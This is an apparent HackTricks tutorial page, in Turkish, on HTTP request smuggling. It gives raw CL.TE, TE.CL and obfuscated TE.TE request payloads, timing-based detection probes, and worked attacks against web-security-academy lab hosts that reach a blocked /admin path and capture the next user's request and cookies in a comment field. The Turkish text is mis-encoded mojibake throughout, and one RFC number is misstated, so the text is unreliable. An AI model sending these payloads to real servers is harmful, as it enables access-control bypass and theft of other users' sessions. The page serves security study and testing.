# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Nedir

Bu zafiyet, **Ã¶n uÃ§ proxyleri** ile **arka uÃ§** sunucu arasÄ±nda bir **senkronizasyon bozukluÄŸu** olduÄŸunda meydana gelir ve bu, bir **saldÄ±rganÄ±n** HTTP **isteÄŸi** gÃ¶ndermesine olanak tanÄ±r; bu istek **Ã¶n uÃ§** proxyleri tarafÄ±ndan **tek bir istek** olarak ve **arka uÃ§** sunucu tarafÄ±ndan **2 istek** olarak **yorumlanÄ±r**.\
Bu, bir kullanÄ±cÄ±nÄ±n **arka uÃ§ sunucusuna gelen bir sonraki isteÄŸi deÄŸiÅŸtirmesine** olanak tanÄ±r.

### Teori

[**RFC Spesifikasyonu (2161)**](https://tools.ietf.org/html/rfc2616)

> EÄŸer bir mesaj hem Transfer-Encoding baÅŸlÄ±k alanÄ± hem de Content-Length baÅŸlÄ±k alanÄ± ile alÄ±nÄ±rsa, ikincisi GÃ–ZARDI EDÄ°LMELÄ°DÄ°R.

**Content-Length**

> Content-Length varlÄ±k baÅŸlÄ±ÄŸÄ±, alÄ±cÄ±ya gÃ¶nderilen varlÄ±k gÃ¶vdesinin boyutunu, bayt cinsinden belirtir.

**Transfer-Encoding: chunked**

> Transfer-Encoding baÅŸlÄ±ÄŸÄ±, yÃ¼k gÃ¶vdesinin kullanÄ±cÄ±ya gÃ¼venli bir ÅŸekilde aktarÄ±lmasÄ± iÃ§in kullanÄ±lan kodlama biÃ§imini belirtir.\
> Chunked, bÃ¼yÃ¼k verilerin bir dizi parÃ§a halinde gÃ¶nderildiÄŸi anlamÄ±na gelir.

### GerÃ§eklik

**Ã–n UÃ§** (bir yÃ¼k dengeleyici / Ters Proxy) _**content-length**_ veya _**transfer-encoding**_ baÅŸlÄ±ÄŸÄ±nÄ± **iÅŸler** ve **Arka UÃ§** sunucu **diÄŸerini iÅŸler**, bu da iki sistem arasÄ±nda bir **senkronizasyon bozukluÄŸu** yaratÄ±r.\
Bu, **bir saldÄ±rganÄ±n ters proxyye bir istek gÃ¶ndermesine** olanak tanÄ±r ve bu istek **arka uÃ§** sunucu tarafÄ±ndan **2 farklÄ± istek** olarak **yorumlanÄ±r**. Bu tekniÄŸin **tehlikesi**, **arka uÃ§** sunucunun **2. isteÄŸi enjekte edilmiÅŸ** gibi **yorumlamasÄ±** ve o istemcinin **gerÃ§ek isteÄŸinin** **enjekte edilen isteÄŸin** bir parÃ§asÄ± olmasÄ±dÄ±r.

### Ã–zellikler

HTTP'de **yeni bir satÄ±r karakteri 2 bayttan oluÅŸur:**

* **Content-Length**: Bu baÅŸlÄ±k, isteÄŸin **gÃ¶vdesinin** **bayt** sayÄ±sÄ±nÄ± belirtmek iÃ§in bir **ondalÄ±k sayÄ±** kullanÄ±r. GÃ¶vdenin son karakterde bitmesi beklenir, **isteÄŸin sonunda yeni bir satÄ±ra ihtiyaÃ§ yoktur**.
* **Transfer-Encoding:** Bu baÅŸlÄ±k, **gÃ¶vde** iÃ§inde bir **onaltÄ±lÄ±k sayÄ±** kullanarak **bir sonraki parÃ§anÄ±n** **bayt** sayÄ±sÄ±nÄ± belirtir. **ParÃ§a** bir **yeni satÄ±r** ile **bitmelidir** ancak bu yeni satÄ±r **uzunluk gÃ¶stergesi tarafÄ±ndan sayÄ±lmaz**. Bu aktarÄ±m yÃ¶ntemi, **0 boyutunda bir parÃ§a ile 2 yeni satÄ±rla** bitmelidir: `0`
* **Connection**: Deneyimlerime dayanarak, istek Smuggling'in ilk isteÄŸinde **`Connection: keep-alive`** kullanÄ±lmasÄ± Ã¶nerilir.

## Temel Ã–rnekler

{% hint style="success" %}
Burp Suite ile bunu sÃ¶mÃ¼rmeye Ã§alÄ±ÅŸÄ±rken **`Update Content-Length` ve `Normalize HTTP/1 line endings`** seÃ§eneklerini repeater'da devre dÄ±ÅŸÄ± bÄ±rakÄ±n Ã§Ã¼nkÃ¼ bazÄ± araÃ§lar yeni satÄ±rlarÄ±, taÅŸÄ±ma dÃ¶nÃ¼ÅŸlerini ve hatalÄ± iÃ§erik uzunluklarÄ±nÄ± kÃ¶tÃ¼ye kullanÄ±r.
{% endhint %}

HTTP istek smuggling saldÄ±rÄ±larÄ±, **Content-Length** (CL) ve **Transfer-Encoding** (TE) baÅŸlÄ±klarÄ±nÄ±n Ã¶n uÃ§ ve arka uÃ§ sunucular tarafÄ±ndan nasÄ±l yorumlandÄ±ÄŸÄ±ndaki tutarsÄ±zlÄ±klardan yararlanan belirsiz istekler gÃ¶ndererek oluÅŸturulur. Bu saldÄ±rÄ±lar, esas olarak **CL.TE**, **TE.CL** ve **TE.TE** olarak farklÄ± biÃ§imlerde ortaya Ã§Ä±kabilir. Her tÃ¼r, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bu baÅŸlÄ±klarÄ± nasÄ±l Ã¶nceliklendirdiÄŸinin benzersiz bir kombinasyonunu temsil eder. Zafiyetler, sunucularÄ±n aynÄ± isteÄŸi farklÄ± ÅŸekillerde iÅŸlemesinden kaynaklanÄ±r ve beklenmedik ve potansiyel olarak kÃ¶tÃ¼ niyetli sonuÃ§lara yol aÃ§ar.

### Zafiyet TÃ¼rlerinin Temel Ã–rnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Zafiyeti (Content-Length Ã–n UÃ§ tarafÄ±ndan, Transfer-Encoding Arka UÃ§ tarafÄ±ndan kullanÄ±lÄ±r)

* **Ã–n UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na gÃ¶re iÅŸler.
* **Arka UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na gÃ¶re iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸeri gerÃ§ek iÃ§erik uzunluÄŸuyla eÅŸleÅŸmeyen bir istek gÃ¶nderir.
* Ã–n uÃ§ sunucu, `Content-Length` deÄŸerine dayanarak tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± nedeniyle isteÄŸi parÃ§a parÃ§a olarak iÅŸler ve kalan veriyi ayrÄ±, sonraki bir istek olarak yorumlar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Zafiyeti (Transfer-Encoding Ã–n UÃ§ tarafÄ±ndan, Content-Length Arka UÃ§ tarafÄ±ndan kullanÄ±lÄ±r)

* **Ã–n UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na gÃ¶re iÅŸler.
* **Arka UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na gÃ¶re iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, parÃ§a boyutunun (`7b`) ve gerÃ§ek iÃ§erik uzunluÄŸunun (`Content-Length: 4`) uyumlu olmadÄ±ÄŸÄ± bir parÃ§a isteÄŸi gÃ¶nderir.
* Ã–n uÃ§ sunucu, `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±nÄ± dikkate alarak tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ± dikkate alarak isteÄŸin yalnÄ±zca ilk kÄ±smÄ±nÄ± (`7b` bayt) iÅŸler ve geri kalanÄ±nÄ± istenmeyen bir sonraki isteÄŸin parÃ§asÄ± olarak bÄ±rakÄ±r.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Zafiyeti (Her ikisi de Transfer-Encoding kullanÄ±yor, obfuscation ile)

* **Sunucular:** Her ikisi de `Transfer-Encoding` destekliyor, ancak biri obfuscation yoluyla bunu gÃ¶z ardÄ± etmeye ikna edilebilir.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, obfuscate edilmiÅŸ `Transfer-Encoding` baÅŸlÄ±klarÄ± ile bir istek gÃ¶nderir.
* Hangi sunucunun (Ã¶n uÃ§ veya arka uÃ§) obfuscation'Ä± tanÄ±madÄ±ÄŸÄ±na baÄŸlÄ± olarak, bir CL.TE veya TE.CL zafiyeti sÃ¶mÃ¼rÃ¼lebilir.
* Ä°steÄŸin iÅŸlenmemiÅŸ kÄ±smÄ±, sunuculardan biri tarafÄ±ndan gÃ¶rÃ¼ldÃ¼ÄŸÃ¼nde, sonraki bir isteÄŸin parÃ§asÄ± haline gelir ve smuggling'e yol aÃ§ar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Content-Length her iki tarafÃ§a da kullanÄ±lÄ±r):**

* Her iki sunucu da isteÄŸi yalnÄ±zca `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* Bu senaryo genellikle smuggling'e yol aÃ§maz, Ã§Ã¼nkÃ¼ her iki sunucu da isteÄŸin uzunluÄŸunu yorumlama konusunda uyumludur.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL != 0 Senaryosu:**

* `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n mevcut olduÄŸu ve sÄ±fÄ±rdan farklÄ± bir deÄŸere sahip olduÄŸu senaryolarÄ± ifade eder; bu, isteÄŸin gÃ¶vdesinin iÃ§erik taÅŸÄ±dÄ±ÄŸÄ±nÄ± gÃ¶sterir.
* Smuggling saldÄ±rÄ±larÄ±nÄ± anlamak ve oluÅŸturmak iÃ§in kritik Ã¶neme sahiptir, Ã§Ã¼nkÃ¼ sunucularÄ±n bir isteÄŸin sonunu belirlemesini etkiler.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### Web sunucusunu kÄ±rmak

Bu teknik, **ilk HTTP verilerini okurken bir web sunucusunu kÄ±rma** olanaÄŸÄ±nÄ±n bulunduÄŸu senaryolarda da faydalÄ±dÄ±r, ancak **baÄŸlantÄ±yÄ± kapatmadan**. Bu ÅŸekilde, HTTP isteÄŸinin **gÃ¶vdesi** **bir sonraki HTTP isteÄŸi** olarak kabul edilecektir.

Ã–rneÄŸin, [**bu yazÄ±da**](https://mizu.re/post/twisty-python) aÃ§Ä±klandÄ±ÄŸÄ± gibi, Werkzeug'ta bazÄ± **Unicode** karakterleri gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼ ve bu sunucunun **kÄ±rÄ±lmasÄ±na** neden oluyordu. Ancak, HTTP baÄŸlantÄ±sÄ± **`Connection: keep-alive`** baÅŸlÄ±ÄŸÄ± ile oluÅŸturulmuÅŸsa, isteÄŸin gÃ¶vdesi okunmayacak ve baÄŸlantÄ± hala aÃ§Ä±k kalacaktÄ±r, bu nedenle isteÄŸin **gÃ¶vdesi** **bir sonraki HTTP isteÄŸi** olarak iÅŸlenecektir.

#### Hop-by-hop baÅŸlÄ±klarÄ± ile zorlamak

Hop-by-hop baÅŸlÄ±klarÄ±nÄ± kÃ¶tÃ¼ye kullanarak, proxy'ye **Content-Length veya Transfer-Encoding baÅŸlÄ±ÄŸÄ±nÄ± silmesini belirtebilir ve bÃ¶ylece HTTP istek smuggling'ini kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼n hale getirebilirsiniz**.
```
Connection: Content-Length
```
For **daha fazla bilgi iÃ§in hop-by-hop baÅŸlÄ±klarÄ±** ziyaret edin:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP Ä°steÄŸi KaÃ§Ä±rma Bulma

HTTP isteÄŸi kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± tanÄ±mlamak genellikle zamanlama teknikleri kullanÄ±larak gerÃ§ekleÅŸtirilebilir; bu teknikler, sunucunun manipÃ¼le edilmiÅŸ isteklere yanÄ±t vermesi iÃ§in ne kadar sÃ¼re geÃ§tiÄŸini gÃ¶zlemlemeye dayanÄ±r. Bu teknikler, Ã¶zellikle CL.TE ve TE.CL aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in faydalÄ±dÄ±r. Bu yÃ¶ntemlerin yanÄ± sÄ±ra, bu tÃ¼r aÃ§Ä±klarÄ± bulmak iÃ§in kullanÄ±labilecek diÄŸer stratejiler ve araÃ§lar da vardÄ±r:

### Zamanlama Teknikleri Kullanarak CL.TE AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±k ise, arka uÃ§ sunucunun ek veri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucu, isteÄŸi `Content-Length` temelinde iÅŸler ve mesajÄ± erken keser.
* Arka uÃ§ sunucu, parÃ§alÄ± bir mesaj bekleyerek, asla gelmeyecek olan bir sonraki parÃ§ayÄ± bekler ve bu da bir gecikmeye neden olur.
* **GÃ¶stergeler:**
* YanÄ±t sÃ¼relerinde zaman aÅŸÄ±mÄ± veya uzun gecikmeler.
* Arka uÃ§ sunucudan 400 Bad Request hatasÄ± almak, bazen ayrÄ±ntÄ±lÄ± sunucu bilgileri ile birlikte.

### Zamanlama Teknikleri Kullanarak TE.CL AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±k ise, arka uÃ§ sunucunun ek veri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucu, isteÄŸi `Transfer-Encoding` temelinde iÅŸler ve tÃ¼m mesajÄ± iletir.
* Arka uÃ§ sunucu, `Content-Length` temelinde bir mesaj bekleyerek, asla gelmeyecek olan ek veriyi bekler ve bu da bir gecikmeye neden olur.

### AÃ§Ä±klarÄ± Bulmak iÃ§in DiÄŸer YÃ¶ntemler

* **FarklÄ± YanÄ±t Analizi:**
* Bir isteÄŸin hafifÃ§e farklÄ± versiyonlarÄ±nÄ± gÃ¶nderin ve sunucu yanÄ±tlarÄ±nÄ±n beklenmedik bir ÅŸekilde farklÄ± olup olmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin; bu, bir ayrÄ±ÅŸtÄ±rma tutarsÄ±zlÄ±ÄŸÄ±nÄ± gÃ¶sterir.
* **Otomatik AraÃ§lar Kullanma:**
* Burp Suite'in 'HTTP Request Smuggler' eklentisi gibi araÃ§lar, Ã§eÅŸitli belirsiz istekler gÃ¶ndererek ve yanÄ±tlarÄ± analiz ederek bu aÃ§Ä±klarÄ± otomatik olarak test edebilir.
* **Content-Length Varyans Testleri:**
* GerÃ§ek iÃ§erik uzunluÄŸu ile uyumlu olmayan deÄŸiÅŸken `Content-Length` deÄŸerleri ile istekler gÃ¶nderin ve sunucunun bu tÃ¼r uyumsuzluklarÄ± nasÄ±l ele aldÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin.
* **Transfer-Encoding Varyans Testleri:**
* Obfuscate edilmiÅŸ veya hatalÄ± `Transfer-Encoding` baÅŸlÄ±klarÄ± ile istekler gÃ¶nderin ve Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±nÄ±n bu tÃ¼r manipÃ¼lasyonlara nasÄ±l farklÄ± yanÄ±t verdiÄŸini izleyin.

### HTTP Ä°steÄŸi KaÃ§Ä±rma AÃ§Ä±ÄŸÄ± Testi

Zamanlama tekniklerinin etkinliÄŸini doÄŸruladÄ±ktan sonra, istemci isteklerinin manipÃ¼le edilip edilemeyeceÄŸini doÄŸrulamak Ã¶nemlidir. Basit bir yÃ¶ntem, isteklerinizi zehirlemeyi denemektir; Ã¶rneÄŸin, `/` isteÄŸi gÃ¶ndererek 404 yanÄ±tÄ± almak. Daha Ã¶nce [Temel Ã–rnekler](./#basic-examples) bÃ¶lÃ¼mÃ¼nde tartÄ±ÅŸÄ±lan `CL.TE` ve `TE.CL` Ã¶rnekleri, istemcinin farklÄ± bir kaynaÄŸa eriÅŸmeyi hedeflemesine raÄŸmen, 404 yanÄ±tÄ± almak iÃ§in bir istemci isteÄŸini nasÄ±l zehirleyeceÄŸinizi gÃ¶stermektedir.

**Anahtar Dikkat NoktalarÄ±**

DiÄŸer isteklerle mÃ¼dahale ederek istek kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± test ederken, aklÄ±nÄ±zda bulundurmanÄ±z gerekenler:

* **AyrÄ± AÄŸ BaÄŸlantÄ±larÄ±:** "SaldÄ±rÄ±" ve "normal" istekler ayrÄ± aÄŸ baÄŸlantÄ±larÄ± Ã¼zerinden gÃ¶nderilmelidir. Her iki istek iÃ§in aynÄ± baÄŸlantÄ±yÄ± kullanmak, aÃ§Ä±ÄŸÄ±n varlÄ±ÄŸÄ±nÄ± doÄŸrulamaz.
* **TutarlÄ± URL ve Parametreler:** Her iki istek iÃ§in de aynÄ± URL'leri ve parametre adlarÄ±nÄ± kullanmaya Ã§alÄ±ÅŸÄ±n. Modern uygulamalar genellikle istekleri URL ve parametrelere gÃ¶re belirli arka uÃ§ sunucularÄ±na yÃ¶nlendirir. BunlarÄ±n eÅŸleÅŸmesi, her iki isteÄŸin de aynÄ± sunucu tarafÄ±ndan iÅŸlenme olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r; bu, baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in bir Ã¶n koÅŸuldur.
* **Zamanlama ve YarÄ±ÅŸ KoÅŸullarÄ±:** "Normal" istek, "saldÄ±rÄ±" isteÄŸinden gelen mÃ¼dahaleyi tespit etmek iÃ§in diÄŸer eÅŸzamanlÄ± uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteÄŸi "saldÄ±rÄ±" isteÄŸinden hemen sonra gÃ¶nderin. YoÄŸun uygulamalar, kesin bir aÃ§Ä±k doÄŸrulamasÄ± iÃ§in birden fazla deneme gerektirebilir.
* **YÃ¼k Dengeleme ZorluklarÄ±:** YÃ¼k dengeleyici olarak hareket eden Ã¶n uÃ§ sunucularÄ±, istekleri Ã§eÅŸitli arka uÃ§ sistemlerine daÄŸÄ±tabilir. EÄŸer "saldÄ±rÄ±" ve "normal" istekler farklÄ± sistemlerde sonuÃ§lanÄ±rsa, saldÄ±rÄ± baÅŸarÄ±lÄ± olmayacaktÄ±r. Bu yÃ¼k dengeleme durumu, bir aÃ§Ä±ÄŸÄ± doÄŸrulamak iÃ§in birkaÃ§ deneme gerektirebilir.
* **Ä°stenmeyen KullanÄ±cÄ± Etkisi:** EÄŸer saldÄ±rÄ±nÄ±z baÅŸka bir kullanÄ±cÄ±nÄ±n isteÄŸini (gÃ¶nderdiÄŸiniz "normal" isteÄŸi deÄŸil) istemeden etkiliyorsa, bu, saldÄ±rÄ±nÄ±zÄ±n baÅŸka bir uygulama kullanÄ±cÄ±sÄ±nÄ± etkilediÄŸini gÃ¶sterir. SÃ¼rekli test, diÄŸer kullanÄ±cÄ±larÄ± rahatsÄ±z edebilir; bu nedenle dikkatli bir yaklaÅŸÄ±m gereklidir.

## HTTP Ä°steÄŸi KaÃ§Ä±rma KÃ¶tÃ¼ye KullanÄ±mÄ±

### HTTP Ä°steÄŸi KaÃ§Ä±rma ile Ã–n UÃ§ GÃ¼venliÄŸini AÅŸma

Bazen, Ã¶n uÃ§ proxy'leri gÃ¼venlik Ã¶nlemleri uygular ve gelen istekleri inceler. Ancak, bu Ã¶nlemler HTTP Ä°steÄŸi KaÃ§Ä±rma kullanÄ±larak aÅŸÄ±labilir ve kÄ±sÄ±tlÄ± uÃ§ noktalarÄ±na yetkisiz eriÅŸim saÄŸlanabilir. Ã–rneÄŸin, `/admin` eriÅŸimi dÄ±ÅŸarÄ±dan yasaklanmÄ±ÅŸ olabilir ve Ã¶n uÃ§ proxy bu tÃ¼r giriÅŸimleri aktif olarak engelleyebilir. Ancak, bu proxy, kaÃ§Ä±rÄ±lmÄ±ÅŸ bir HTTP isteÄŸi iÃ§indeki gÃ¶mÃ¼lÃ¼ istekleri incelemeyi ihmal edebilir ve bu da bu kÄ±sÄ±tlamalarÄ± aÅŸmak iÃ§in bir aÃ§Ä±k bÄ±rakÄ±r.

AÅŸaÄŸÄ±daki Ã¶rnekler, HTTP Ä°steÄŸi KaÃ§Ä±rma'nÄ±n Ã¶n uÃ§ gÃ¼venlik kontrollerini aÅŸmak iÃ§in nasÄ±l kullanÄ±labileceÄŸini, Ã¶zellikle Ã¶n uÃ§ proxy tarafÄ±ndan genellikle korunan `/admin` yolunu hedef alarak gÃ¶stermektedir:

**CL.TE Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§ isteÄŸi iÃ§in `Content-Length` baÅŸlÄ±ÄŸÄ± kullanÄ±lÄ±rken, sonraki gÃ¶mÃ¼lÃ¼ istek `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r. Ã–n uÃ§ proxy, baÅŸlangÄ±Ã§ `POST` isteÄŸini iÅŸler ancak gÃ¶mÃ¼lÃ¼ `GET /admin` isteÄŸini denetlemeyi baÅŸaramaz, bu da `/admin` yoluna yetkisiz eriÅŸime izin verir.

**TE.CL Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Tersine olarak, TE.CL saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§taki `POST` isteÄŸi `Transfer-Encoding: chunked` kullanÄ±r ve sonraki gÃ¶mÃ¼lÃ¼ istek `Content-Length` baÅŸlÄ±ÄŸÄ±na gÃ¶re iÅŸlenir. CL.TE saldÄ±rÄ±sÄ±na benzer ÅŸekilde, Ã¶n uÃ§ proxy, kaÃ§Ä±rÄ±lan `GET /admin` isteÄŸini gÃ¶z ardÄ± eder ve istemeden de olsa kÄ±sÄ±tlÄ± `/admin` yoluna eriÅŸim saÄŸlar.

### Ã–n uÃ§ istek yeniden yazÄ±mÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±karma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uÃ§ sunucusuna iletmeden Ã¶nce deÄŸiÅŸtirmek iÃ§in bir **Ã¶n uÃ§ sunucusu** kullanÄ±r. Tipik bir deÄŸiÅŸiklik, arka uca istemcinin IP'sini iletmek iÃ§in `X-Forwarded-For: <IP of the client>` gibi baÅŸlÄ±klar eklemeyi iÃ§erir. Bu deÄŸiÅŸiklikleri anlamak kritik olabilir, Ã§Ã¼nkÃ¼ **korumalarÄ± aÅŸmanÄ±n** veya **gizli bilgileri veya uÃ§ noktalarÄ± aÃ§Ä±ÄŸa Ã§Ä±karmanÄ±n** yollarÄ±nÄ± ortaya Ã§Ä±karabilir.

Bir proxy'nin isteÄŸi nasÄ±l deÄŸiÅŸtirdiÄŸini araÅŸtÄ±rmak iÃ§in, arka uÃ§ta yanÄ±t olarak yankÄ±lanan bir POST parametresi bulun. ArdÄ±ndan, bu parametreyi en sona koyarak aÅŸaÄŸÄ±daki gibi bir istek oluÅŸturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapÄ±da, sonraki istek bileÅŸenleri `search=` ifadesinden sonra eklenir; bu, yanÄ±tta yansÄ±tÄ±lan parametredir. Bu yansÄ±ma, sonraki isteÄŸin baÅŸlÄ±klarÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±karacaktÄ±r.

Ä°Ã§ iÃ§e isteÄŸin `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n gerÃ§ek iÃ§erik uzunluÄŸu ile hizalanmasÄ± Ã¶nemlidir. KÃ¼Ã§Ã¼k bir deÄŸerle baÅŸlayÄ±p yavaÅŸÃ§a artÄ±rmak tavsiye edilir; Ã§Ã¼nkÃ¼ Ã§ok dÃ¼ÅŸÃ¼k bir deÄŸer yansÄ±tÄ±lan veriyi keserken, Ã§ok yÃ¼ksek bir deÄŸer isteÄŸin hata vermesine neden olabilir.

Bu teknik, bir TE.CL aÃ§Ä±ÄŸÄ± baÄŸlamÄ±nda da uygulanabilir, ancak istek `search=\r\n0` ile sonlanmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

Bu yÃ¶ntem esasen Ã¶n uÃ§ proxy tarafÄ±ndan yapÄ±lan istek deÄŸiÅŸikliklerini anlamak iÃ§in kullanÄ±lÄ±r ve temelde kendi kendine yÃ¶nlendirilmiÅŸ bir araÅŸtÄ±rma yapar.

### DiÄŸer kullanÄ±cÄ±larÄ±n isteklerini yakalamak <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST iÅŸlemi sÄ±rasÄ±nda bir parametrenin deÄŸeri olarak belirli bir isteÄŸi ekleyerek bir sonraki kullanÄ±cÄ±nÄ±n isteklerini yakalamak mÃ¼mkÃ¼ndÃ¼r. Bunu ÅŸu ÅŸekilde gerÃ§ekleÅŸtirebilirsiniz:

AÅŸaÄŸÄ±daki isteÄŸi bir parametrenin deÄŸeri olarak ekleyerek, sonraki istemcinin isteÄŸini depolayabilirsiniz:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **comment parametresi**, kamuya aÃ§Ä±k bir sayfadaki bir gÃ¶nderinin yorum bÃ¶lÃ¼mÃ¼ndeki iÃ§erikleri saklamak iÃ§in tasarlanmÄ±ÅŸtÄ±r. SonuÃ§ olarak, sonraki isteÄŸin iÃ§eriÄŸi bir yorum olarak gÃ¶rÃ¼necektir.

